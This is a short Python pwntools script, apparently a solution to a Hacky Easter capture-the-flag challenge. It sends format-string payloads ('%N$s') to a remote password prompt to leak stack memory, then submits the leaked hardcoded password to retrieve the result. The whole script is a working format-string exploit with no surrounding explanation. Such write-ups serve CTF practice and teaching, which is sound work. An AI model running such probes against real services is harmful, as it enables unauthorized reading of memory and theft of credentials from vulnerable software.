#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = 'ch.hackyeaster.com'

# Find the password, can also be done manually
for i in range(1,10):
    try:
        io = remote(host, 2313)
        io.recvuntil(b'password: ')
        io.sendline('%' + str(i) + '$s')
        io.recvline()
        print(i, io.recvline())
        io.close()
    except:
        continue

# Enter the password
io = remote(host, 2313)
io.recvuntil(b'password: ')
io.sendline(b'5uP3R_s3cUr3_PW')
io.recvline()
io.recvline()
print(io.recvline())
io.close()
